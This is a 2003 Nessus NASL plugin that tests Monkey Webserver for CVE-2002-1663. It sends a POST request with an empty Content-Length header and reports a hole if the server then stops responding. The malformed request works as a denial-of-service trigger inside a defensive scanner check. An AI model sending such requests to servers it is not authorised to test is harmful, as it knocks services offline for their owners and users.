#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
# Ref:
# From: Daniel <keziah@uole.com>
# Subject: Bug in Monkey Webserver 0.5.0 or minors versions
# To: bugtraq@securityfocus.com
# Date: Sun, 3 Nov 2002 23:21:42 -0300
#

if(description)
{
 script_id(11924);
 script_cve_id("CVE-2002-1663");
 script_bugtraq_id(6096);
 script_version ("$Revision: 1.6 $");
 
 name["english"] = "POST with empty Content-Length";
 script_name(english:name["english"]);
 
 desc["english"] = "
Your web server crashes when it receives an incorrect POST
command with an empty 'Content-Length:' field.

A cracker may use this bug to disable your server, preventing 
it from publishing your information.
 
Risk factor : High

Solution : Upgrade your web server.";
 script_description(english:desc["english"]);
 
 summary["english"] = "POST with empty Content-Length line kills Monkey Web server";
 script_summary(english:summary["english"]);
 
 # No use to make an ACT_MIXED_ from this
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 # The listening port in the example configuration file is 2001
 # I suspect that some people might leave it unchanged.
 script_require_ports("Services/www",80, 2001);
 exit(0);
}

#
include("http_func.inc");

port = get_http_port(default:80);
	# 2001 ?
if(! get_port_state(port)) exit(0);

if (http_is_dead(port:port)) exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);
r = http_post(item: "/", port: port, data: "");
r2 = ereg_replace(string: r,
	pattern: 'Content-Length:([ 0-9]+)', replace: 'Content-Length:');
if (r2 == r)	# Did not match?
  r2 = 'POST / HTTP/1.0\r\nContent-Length:\r\n\r\n';

send(socket: soc, data: r2);
r = http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port))
{
  security_hole(port);
  set_kb_item(name:"www/buggy_post_crash", value:TRUE);
}
